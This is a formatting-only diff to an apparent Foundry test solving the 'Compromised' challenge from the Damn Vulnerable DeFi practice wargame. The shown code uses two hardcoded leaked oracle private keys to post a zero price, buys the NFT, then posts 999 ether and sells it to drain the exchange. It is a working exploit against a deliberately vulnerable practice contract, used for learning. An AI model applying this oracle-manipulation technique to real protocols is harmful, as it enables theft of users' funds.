@@ -30,11 +30,7 @@ contract CompromisedChallenge is Test {
     ];
 
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [
-        INITIAL_NFT_PRICE,
-        INITIAL_NFT_PRICE,
-        INITIAL_NFT_PRICE
-    ];
+    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -57,13 +53,10 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
-            .oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
-            address(oracle)
-        );
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
         nft = exchange.token();
 
         vm.stopPrank();
@@ -88,15 +81,14 @@ contract CompromisedChallenge is Test {
         // Private keys of two compromised sources
         uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
         uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
-        
+
         // Get the corresponding addresses
         address source1 = vm.addr(privateKey1);
         address source2 = vm.addr(privateKey2);
 
         // Deploy the attack contract with the ETH player have
-        AttackCompromised attackContract = new AttackCompromised{ value:address(this).balance }(
-            oracle, exchange, nft, recovery
-        );
+        AttackCompromised attackContract =
+            new AttackCompromised{value: address(this).balance}(oracle, exchange, nft, recovery);
 
         // Post 0 price from the compromised sources so we can get the NFT for free
         vm.prank(source1);
@@ -112,7 +104,7 @@ contract CompromisedChallenge is Test {
         oracle.postPrice(symbols[0], 999 ether);
         vm.prank(source2);
         oracle.postPrice(symbols[0], 999 ether);
-        
+
         // Sell and recover the ETH
         attackContract.sell();
         attackContract.recover(999 ether);
@@ -139,22 +131,16 @@ contract CompromisedChallenge is Test {
 /// @notice We need a contract since we need to implement the ERC721Receiver interface
 /// and get the callback after safeMint
 contract AttackCompromised is IERC721Receiver {
-
     // -- State Variables --
     TrustfulOracle private immutable oracle;
     Exchange private immutable exchange;
     DamnValuableNFT private immutable nft;
     address private immutable recovery;
-    
+
     uint256 private nftId;
 
     // -- Constructor --
-    constructor(
-        TrustfulOracle _oracle,
-        Exchange _exchange,
-        DamnValuableNFT _nft,
-        address _recovery
-    ) payable {
+    constructor(TrustfulOracle _oracle, Exchange _exchange, DamnValuableNFT _nft, address _recovery) payable {
         oracle = _oracle;
         exchange = _exchange;
         nft = _nft;
@@ -177,11 +163,18 @@ contract AttackCompromised is IERC721Receiver {
 
     // -- ERC721 Receiver Implementation --
     function onERC721Received(
-        address /*operator*/,
-        address /*from*/,
-        uint256 /*tokenId*/,
+        address,
+        /*operator*/
+        address,
+        /*from*/
+        uint256,
+        /*tokenId*/
         bytes calldata /*data*/
-    ) external pure returns (bytes4) {
+    )
+        external
+        pure
+        returns (bytes4)
+    {
         return this.onERC721Received.selector;
     }
 
